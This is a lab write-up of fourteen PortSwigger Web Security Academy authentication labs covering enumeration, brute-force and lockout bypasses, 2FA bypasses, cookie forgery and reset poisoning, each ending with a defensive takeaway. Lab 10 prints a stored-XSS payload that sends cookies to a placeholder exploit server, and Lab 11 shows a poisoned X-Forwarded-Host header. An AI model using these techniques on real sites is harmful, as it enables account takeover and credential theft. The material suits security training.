# authentication\_writeup

> **Topic:** Authentication Vulnerabilities\
> **Platform:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/authentication)\
> **Labs covered:** 14 labs (Lab 1 – Lab 14)

Authentication vulnerabilities arise when an application fails to properly verify the identity of a user. This writeup covers username enumeration, brute-force attacks, 2FA bypasses, cookie forgery, XSS-based credential theft, and password reset poisoning.

***

## Table of Contents

* [Lab 1 — Username Enumeration via Different Responses](authentication_writeup.md#lab-1--username-enumeration-via-different-responses)
* [Lab 2 — 2FA Simple Bypass](authentication_writeup.md#lab-2--2fa-simple-bypass)
* [Lab 3 — Password Reset Broken Logic](authentication_writeup.md#lab-3--password-reset-broken-logic)
* [Lab 4 — Username Enumeration via Response Timing (Pitchfork)](authentication_writeup.md#lab-4--username-enumeration-via-response-timing-pitchfork)
* [Lab 5 — Username Enumeration via Subtly Different Responses](authentication_writeup.md#lab-5--username-enumeration-via-subtly-different-responses)
* [Lab 6 — Brute-Force Protection Bypass via IP Rotation](authentication_writeup.md#lab-6--brute-force-protection-bypass-via-ip-rotation)
* [Lab 7 — Username Enumeration via Response Length (Cluster Bomb)](authentication_writeup.md#lab-7--username-enumeration-via-response-length-cluster-bomb)
* [Lab 8 — 2FA Broken Logic](authentication_writeup.md#lab-8--2fa-broken-logic)
* [Lab 9 — Brute-Forcing a Stay-Logged-In Cookie](authentication_writeup.md#lab-9--brute-forcing-a-stay-logged-in-cookie)
* [Lab 10 — Offline Password Cracking via XSS](authentication_writeup.md#lab-10--offline-password-cracking-via-xss)
* [Lab 11 — Password Reset Poisoning via Host Header](authentication_writeup.md#lab-11--password-reset-poisoning-via-host-header)
* [Lab 12 — Password Brute-Force via Password Change](authentication_writeup.md#lab-12--password-brute-force-via-password-change)
* [Lab 13 — Brute-Force via JSON Content-Type Bypass](authentication_writeup.md#lab-13--brute-force-via-json-content-type-bypass)
* [Lab 14 — 2FA Brute-Force with Macro](authentication_writeup.md#lab-14--2fa-brute-force-with-macro)

***

## Lab 1 — Username Enumeration via Different Responses

### Objective

> Enumerate a valid username, brute-force this user's password, then access their account page.

### Vulnerability

The application returns a subtly different error message depending on whether a username exists. If the username is wrong it says "Invalid username", but if the username is correct it says "Incorrect password" — leaking the fact that the username is valid.

### Solution

**Step 1:** In Burp Intruder, set the username field as the payload position and load the candidate username wordlist. Launch the attack and watch for responses that differ from the standard "Invalid username" message.

![Brute-forcing usernames in Burp Intruder](<../../.gitbook/assets/Unknown image>)

**Step 2:** The response for the correct username changes to "Incorrect password" — confirming it exists. Note the username.

![Different response revealing valid username](<../../.gitbook/assets/Unknown image (1)>)

**Step 3:** Now set the valid username as fixed and brute-force the password field with the candidate password list.

![Brute-forcing password for confirmed username](<../../.gitbook/assets/Unknown image (2)>)

**Step 4:** A 302 redirect response indicates a successful login. Log in with the discovered credentials.

![Successful login — lab solved](<../../.gitbook/assets/Unknown image (3)>)

### Key Takeaway

Error messages must be consistent regardless of whether the username exists. Use a generic message like "Invalid username or password" for all authentication failures to prevent username enumeration.

***

## Lab 2 — 2FA Simple Bypass

### Objective

> Access Carlos's account page.\
> Your credentials: `wiener:peter` | Victim's credentials: `carlos:montoya`

### Vulnerability

The 2FA verification step is not enforced server-side. After a successful password login, the server redirects to a 2FA page — but skipping directly to `/my-account` works without ever completing 2FA.

### Solution

**Step 1:** Log in as `wiener:peter`. When prompted for the 2FA code, observe that the URL changes to `/login2`. Enter the code normally and note that the next URL is `/my-account`.

![2FA page after wiener login](<../../.gitbook/assets/Unknown image (4)>)

**Step 2:** Now log in as `carlos:montoya`. When the 2FA prompt appears, instead of entering the code, manually change the URL from `/login2` to `/my-account`.

![Bypassing 2FA by navigating directly to /my-account](<../../.gitbook/assets/Unknown image (5)>)

The server grants access without verifying the 2FA code — lab solved.

### Key Takeaway

2FA must be enforced server-side on every protected route. Never rely on client-side redirects to enforce security steps — a user can simply navigate around them.

***

## Lab 3 — Password Reset Broken Logic

### Objective

> Reset Carlos's password, then log in and access his account page.\
> Your credentials: `wiener:peter` | Victim: `carlos`

### Vulnerability

The password reset flow uses a temporary token sent via email, but also includes a hidden `username` parameter in the reset form. The server trusts this parameter to determine whose password to reset — meaning an attacker can change the username to `carlos` while using their own valid reset token.

### Solution

**Step 1:** Log in as `wiener` and trigger a password reset for your own account. Click the reset link in the email and intercept the reset request in Burp Suite.

**Step 2:** In the intercepted request, observe the hidden `temp-forgot-password-token` field and a `username` field. Remove the token value (set it to empty) and change `username` to `carlos`.

![Modified password reset request — username changed to carlos, token removed](<../../.gitbook/assets/Unknown image (6)>)

**Step 3:** Forward the request. The server processes the reset for carlos's account. Log in as `carlos` using the new password you set.

### Key Takeaway

Password reset tokens must be cryptographically tied to a specific user server-side. The `username` should never be accepted as a user-controlled parameter in the reset flow — the token itself must identify the account.

***

## Lab 4 — Username Enumeration via Response Timing (Pitchfork)

### Objective

> Enumerate a valid username, brute-force this user's password, then access their account page.

### Vulnerability

The application takes longer to process login requests when the username is valid (because it then checks the password hash). By measuring response times, valid usernames can be identified. The app also rate-limits by IP, which can be bypassed using the `X-Forwarded-For` header.

### Solution

**Step 1:** Use Burp Intruder in **Pitchfork** mode with two payload positions: the `X-Forwarded-For` header (incrementing IP addresses to bypass rate limiting) and the username field.

![Pitchfork attack — X-Forwarded-For + username](<../../.gitbook/assets/Unknown image (7)>)

**Step 2:** Sort results by response time. The valid username produces a noticeably longer response due to password hash computation.

![Response time spike reveals valid username](<../../.gitbook/assets/Unknown image (8)>)

**Step 3:** Repeat with the confirmed username fixed, now brute-forcing the password field (still rotating IPs).

![Password brute-force with confirmed username](<../../.gitbook/assets/Unknown image (9)>)

### Key Takeaway

Response time differences can leak information even when error messages are identical. Use constant-time comparison for authentication checks and apply rate limiting in a way that cannot be bypassed by header spoofing.

***

## Lab 5 — Username Enumeration via Subtly Different Responses

### Objective

> Enumerate a valid username, brute-force this user's password, then access their account page.

### Vulnerability

The application returns nearly identical error messages for invalid usernames and incorrect passwords — but there is a subtle difference (e.g., a trailing space or punctuation difference). Burp Intruder's grep feature can detect this difference at scale.

### Solution

**Step 1:** Run a username enumeration attack in Burp Intruder. Use the "Grep - Extract" or "Grep - Match" feature to flag responses where the error message differs slightly from the baseline.

![Username enumeration — grep for subtle message difference](<../../.gitbook/assets/Unknown image (10)>)

![Intruder results highlighting anomalous response](<../../.gitbook/assets/Unknown image (11)>)

**Step 2:** The username `adserver` produces a response with noticeably lower response length — indicating a subtly different message (missing trailing character or punctuation in the error).

![adserver identified as valid username via response length](<../../.gitbook/assets/Unknown image (12)>)

**Step 3:** Brute-force the password for `adserver`. The password `987654321` returns a shorter response (and eventually a 302 redirect).

![Password 987654321 identified via response length](<../../.gitbook/assets/Unknown image (13)>)

**Step 4:** Log in with the discovered credentials.

![Successful login — lab solved](<../../.gitbook/assets/Unknown image (14)>)

### Key Takeaway

Even tiny inconsistencies in error messages — a missing period, an extra space — can be detected programmatically. All authentication failure responses must be byte-for-byte identical.

***

## Lab 6 — Brute-Force Protection Bypass via IP Rotation

### Objective

> Brute-force the victim's password, then log in and access their account page.

### Vulnerability

The application blocks an IP after too many failed login attempts. However, this counter resets if a successful login occurs from the same IP. By interleaving valid credentials with the brute-force attempts, the lockout is never triggered.

### Solution

**Step 1:** Build a combined username/password list where every third entry is your own valid credentials (`wiener:peter`), with the attack credentials interspersed.

![Combined payload list — valid credentials every Nth entry](<../../.gitbook/assets/Unknown image (15)>)

**Step 2:** Load the password candidates alongside the rotation logic.

![Password list used in the attack](<../../.gitbook/assets/Unknown image (16)>)

**Step 3:** Run the Intruder attack. Each successful login of `wiener` resets the lockout counter, allowing the brute-force to continue uninterrupted.

![Attack running — lockout bypassed via periodic valid login](<../../.gitbook/assets/Unknown image (17)>)

![Correct password identified in results](<../../.gitbook/assets/Unknown image (18)>)

**Step 4:** Log in with the victim's discovered credentials.

![Successful login — lab solved](<../../.gitbook/assets/Unknown image (19)>)

### Key Takeaway

Lockout mechanisms that reset on a successful login are trivially bypassed. Rate limiting should be cumulative and not reset on success. Consider implementing CAPTCHA or device fingerprinting for more robust protection.

***

## Lab 7 — Username Enumeration via Response Length (Cluster Bomb)

### Objective

> Enumerate a valid username, brute-force this user's password, then access their account page.

### Vulnerability

The application changes its response length depending on whether the username is valid. Even if the status code and error message appear the same, differences in HTML content length reveal valid usernames.

### Solution

**Step 1:** Use Burp Intruder in **Sniper** mode on the username field. After the attack, sort results by response length. The valid username `pi` produces a noticeably longer response.

![Username pi identified via max response length](<../../.gitbook/assets/Unknown image (20)>)

**Step 2:** Fix the username as `pi` and brute-force the password. Sort by response length — the correct password `nicole` produces the longest response (or a redirect).

![Password nicole identified via response length](<../../.gitbook/assets/Unknown image (21)>)

**Step 3:** Log in with `pi:nicole`.

![Successful login — lab solved](<../../.gitbook/assets/Unknown image (22)>)

### Key Takeaway

Response length is just as much an information leak as error message text. Normalize response sizes across all authentication failure paths.

***

## Lab 8 — 2FA Broken Logic

### Objective

> This lab's 2FA is vulnerable due to its flawed logic. Access Carlos's account page.

### Vulnerability

The application generates a 2FA code for whichever user is named in a `verify` cookie/parameter — not necessarily the logged-in user. By changing this parameter to `carlos`, an attacker can generate a valid OTP for carlos's account, then brute-force the 4-digit code.

### Solution

**Step 1:** Log in as `wiener`. Intercept the POST request to `/login2`. Observe the `verify` parameter in the cookie or body.

![Login requests captured in Burp — verify parameter visible](<../../.gitbook/assets/Unknown image (23)>)

**Step 2:** Send a GET request to `/login2` with `verify=carlos` in the cookie. This triggers the server to generate and send a 2FA code to carlos's account.

**Step 3:** Now submit a fake OTP to `/login2` with `verify=carlos`. Intercept this request and send it to Intruder. Set the OTP field as the payload position and use a number list from `0000` to `9999`.

![Brute-force setup for carlos's OTP](<../../.gitbook/assets/Unknown image (24)>)

![Intruder running OTP brute-force](<../../.gitbook/assets/Unknown image (25)>)

**Step 4:** Find the request that returns a **302** response — that is the correct OTP. Follow the redirect to access carlos's account.

![302 response — correct OTP found, lab solved](<../../.gitbook/assets/Unknown image (26)>)

### Key Takeaway

2FA codes must be bound to the authenticated session, not a user-controlled parameter. The server must verify that the OTP being submitted belongs to the currently authenticated user.

***

## Lab 9 — Brute-Forcing a Stay-Logged-In Cookie

### Objective

> Brute-force Carlos's stay-logged-in cookie to gain access to his account page.

### Vulnerability

The "stay logged in" cookie is constructed as `base64(username + ":" + md5(password))`. Since MD5 is a fast, unsalted hash, the password can be cracked offline, and the cookie can be forged for any known username.

### Solution

**Step 1:** Log in as `wiener` with "Stay logged in" checked. Intercept the request and copy the `stay-logged-in` cookie value.

![Stay-logged-in cookie captured](<../../.gitbook/assets/Unknown image (27)>)

**Step 2:** Base64-decode the cookie. The format is `wiener:<md5hash>`.

![Cookie decoded — username:md5hash format confirmed](<../../.gitbook/assets/Unknown image (28)>)

**Step 3:** Submit the MD5 hash to [CrackStation](https://crackstation.net/) to confirm the password is hashed with MD5 and recover the plaintext.

![MD5 hash cracked via CrackStation](<../../.gitbook/assets/Unknown image (29)>)

**Step 4:** In Burp Intruder, brute-force the `stay-logged-in` cookie for `carlos`. For each password candidate, generate the cookie as `base64("carlos:" + md5(password))` using a payload processor.

![Intruder attack with forged stay-logged-in cookies](<../../.gitbook/assets/Unknown image (30)>)

**Step 5:** The response with a 302 or different length reveals the correct cookie. Use it to access carlos's account.

![Access granted — lab solved](<../../.gitbook/assets/Unknown image (31)>)

### Key Takeaway

"Remember me" cookies must not encode the password in a reversible or crackable form. Use a cryptographically random, server-side token mapped to the session — never encode credentials directly in the cookie.

***

## Lab 10 — Offline Password Cracking via XSS

### Objective

> Steal Carlos's stay-logged-in cookie using an XSS vulnerability in the comment box, crack the password, and log in to his account.

### Vulnerability

The blog comment section is vulnerable to stored XSS, and carlos visits the page. His browser sends the `stay-logged-in` cookie (which contains his MD5-hashed password) to the injected script's destination — the attacker's exploit server.

### Solution

**Step 1:** Identify the XSS vulnerability in the blog comment box. Post the following payload as a comment:

```html
<script>document.location='https://YOUR-EXPLOIT-SERVER.net/'+document.cookie</script>
```

![XSS payload posted in comment box](<../../.gitbook/assets/Unknown image (32)>)

**Step 2:** When carlos visits the page, his browser executes the script and sends his cookies to your exploit server. Check the exploit server access logs for the request.

![Exploit server access log — cookie received](<../../.gitbook/assets/Unknown image (33)>)

![Carlos's stay-logged-in cookie in the log](<../../.gitbook/assets/Unknown image (34)>)

**Step 3:** Base64-decode the cookie to get `carlos:<md5hash>`. Crack the MD5 hash using CrackStation.

![MD5 hash extracted and cracked](<../../.gitbook/assets/Unknown image (35)>)

![Plaintext password recovered](<../../.gitbook/assets/Unknown image (36)>)

**Step 4:** Log in as carlos using the cracked password (or forge the cookie directly).

### Key Takeaway

HttpOnly cookies cannot be read by JavaScript. Mark session and authentication cookies as `HttpOnly` to prevent XSS from stealing them. Combined with proper output encoding to prevent XSS in the first place, this eliminates this attack vector.

***

## Lab 11 — Password Reset Poisoning via Host Header

### Objective

> This lab is vulnerable to password reset poisoning. Carlos clicks any link in his emails.\
> Log in to Carlos's account.\
> Your credentials: `wiener:peter`

### Vulnerability

The password reset function generates a reset link using the `Host` header from the incoming request. By replacing the `Host` header with an attacker-controlled domain, the reset link is sent to carlos but points to the attacker's server — leaking the token.

### Solution

**Step 1:** Trigger a password reset for your own account (`wiener`). Intercept the request in Burp Suite.

**Step 2:** Modify the request: change the `username` to `carlos` and add (or modify) the `X-Forwarded-Host` header to point to your exploit server:

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net
```

![Password reset request — X-Forwarded-Host poisoned](<../../.gitbook/assets/Unknown image (37)>)

**Step 3:** Carlos receives the email with a reset link pointing to your exploit server. Check the exploit server's access logs to capture the reset token from the URL.

![Reset token captured in exploit server logs](<../../.gitbook/assets/Unknown image (38)>)

**Step 4:** Take the token and use it with the legitimate reset URL (the lab's domain) to reset carlos's password. Go to:

```
https://<LAB-ID>.web-security-academy.net/forgot-password?temp-forgot-password-token=<STOLEN-TOKEN>
```

![Using the stolen token to reset carlos's password](<../../.gitbook/assets/Unknown image (39)>)

**Step 5:** Log in as carlos with the new password.

![Successful login as carlos — lab solved](<../../.gitbook/assets/Unknown image (40)>)

### Key Takeaway

Never use the `Host` header (or `X-Forwarded-Host`) to construct password reset URLs. Hardcode the application's base URL in the server configuration. Validate that the `Host` header matches an allowlist of known domains.

***

## Lab 12 — Password Brute-Force via Password Change

### Objective

> Brute-force Carlos's account password using the password change functionality. Access his account page.

### Vulnerability

The "Change Password" feature leaks information based on the error message returned. When the correct current password is entered but the new passwords don't match, the response differs from when the current password is wrong. This allows the current password to be brute-forced via the change-password endpoint — avoiding account lockout on the login page.

### Solution

**Step 1:** Log in as `wiener` and navigate to the change password page. Observe its behavior:

* Correct current password + mismatched new passwords → different error message
* Wrong current password → standard error

![Change password form — observing behavior](<../../.gitbook/assets/Unknown image (41)>)

![Two different responses based on whether current password is correct](<../../.gitbook/assets/Unknown image (42)>)

**Step 2:** Capture the change-password POST request in Burp Suite. Set `username=carlos`, enter a candidate password in the `current-password` field, and set `new-password-1` and `new-password-2` to different values (to force the "passwords don't match" error when the current password is correct).

![Change password request captured](<../../.gitbook/assets/Unknown image (43)>)

**Step 3:** Send to Intruder and brute-force the `current-password` field with the candidate password list. Look for the response that differs — it means the current password was correct.

![Intruder brute-force on current-password field](<../../.gitbook/assets/Unknown image (44)>)

![Correct password identified via different response](<../../.gitbook/assets/Unknown image (45)>)

**Step 4:** Log in as `carlos` with the discovered password.

### Key Takeaway

Brute-force protection must be applied consistently across all authentication-related endpoints — not just the login page. Password change, password reset, and 2FA endpoints are equally viable attack surfaces.

***

## Lab 13 — Brute-Force via JSON Content-Type Bypass

### Objective

> Brute-force Carlos's account and access his account page.

### Vulnerability

The login endpoint accepts JSON-formatted credentials. When the content type is `application/json`, the application's WAF or rate-limiting logic does not apply — allowing unrestricted brute-force of the password.

### Solution

**Step 1:** Intercept the login request. Notice it sends credentials as a JSON body:

```json
{"username": "carlos", "password": "candidate"}
```

![JSON login request captured](<../../.gitbook/assets/Unknown image (46)>)

**Step 2:** Load all candidate passwords formatted as JSON values into Burp Intruder. Set the `password` value as the payload position.

![Intruder configured with JSON password list](<../../.gitbook/assets/Unknown image (47)>)

![Attack running](<../../.gitbook/assets/Unknown image (48)>)

**Step 3:** A **302** response indicates successful authentication.

![302 response — correct password found](<../../.gitbook/assets/Unknown image (49)>)

**Step 4:** Follow the redirect — carlos's account page is accessible.

![Carlos's account page — lab solved](<../../.gitbook/assets/Unknown image (50)>)

### Key Takeaway

Rate limiting and brute-force protection must apply regardless of the `Content-Type`. Ensure your security controls inspect the request body correctly for all accepted formats (JSON, form-encoded, XML).

***

### Lab 14 — 2FA Brute-Force with Macro

#### Objective

> This lab's 2FA is vulnerable to brute-forcing. You have valid credentials but no access to the 2FA code.\
> Victim's credentials: `carlos:montoya`

#### Vulnerability

The 2FA code is a 4-digit number (10,000 possibilities). After 2 incorrect attempts, the application redirects back to the login page — forcing a full re-login before trying again. By using a Burp macro to automate the login sequence, the 2FA can be brute-forced one attempt at a time.

#### Solution

{% stepper %}
{% step %}
### Step 1

Log in as `carlos:montoya` manually to observe the full flow: login → 2FA page → (after 2 wrong codes) → back to login.
{% endstep %}

{% step %}
### Step 2

In Burp Suite, create a **session handling macro** that:

1. POSTs to `/login` with `carlos:montoya`.
2. POSTs to `/login2` with a placeholder OTP.

![Macro configured in Burp — full login sequence](<../../.gitbook/assets/Unknown image (51)>)
{% endstep %}

{% step %}
### Step 3

Attach the macro to Intruder via **Session Handling Rules** so it runs before each request. Set the OTP field as the payload position and load a `0000–9999` number list.
{% endstep %}

{% step %}
### Step 4

Launch the attack. For each OTP guess, the macro logs in fresh as carlos, then submits the OTP — bypassing the 2-attempt lockout entirely.

![Intruder running with macro — OTP brute-force](<../../.gitbook/assets/Unknown image (52)>)
{% endstep %}

{% step %}
### Step 5

Identify the **302** response — that is the correct OTP. Follow the redirect to verify access to carlos's account.

![302 response confirmed — carlos's account accessed, lab solved](<../../.gitbook/assets/Unknown image (53)>)
{% endstep %}
{% endstepper %}

#### Key Takeaway

2FA codes must have a strict attempt limit that locks the account or introduces an exponential delay — and this limit must not be resettable by simply logging in again. Consider binding the OTP attempt count to the session, not the login step.

### Summary Table

| Lab | Vulnerability                        | Technique                                |
| --- | ------------------------------------ | ---------------------------------------- |
| 1   | Different error messages             | Username enumeration via response text   |
| 2   | 2FA not enforced server-side         | Direct navigation to `/my-account`       |
| 3   | `username` param trusted in reset    | Token reuse with changed username        |
| 4   | Response timing leak + IP rate limit | Pitchfork + X-Forwarded-For rotation     |
| 5   | Subtle message difference            | Response length grep in Intruder         |
| 6   | Lockout resets on valid login        | Interleaving valid credentials           |
| 7   | Response length leak                 | Cluster Bomb / Sniper length sort        |
| 8   | `verify` param controls OTP target   | OTP brute-force for carlos               |
| 9   | Cookie = base64(user:md5(pass))      | Offline MD5 crack + cookie forgery       |
| 10  | XSS + weak cookie encoding           | Steal cookie via exploit server          |
| 11  | Host header used in reset URL        | X-Forwarded-Host poisoning               |
| 12  | Change-password response leak        | Brute-force via change-password endpoint |
| 13  | Rate limit bypassed for JSON         | JSON content-type brute-force            |
| 14  | 2FA lockout resets on re-login       | Burp macro + Intruder OTP brute-force    |

### Tools Used

* **Burp Suite** (Proxy, Intruder, Repeater, Session Handling Macros)
* **CrackStation** — online MD5/hash cracking
* **Exploit Server** — PortSwigger's built-in exploit delivery server

### References

* [PortSwigger: Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
* [OWASP: Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
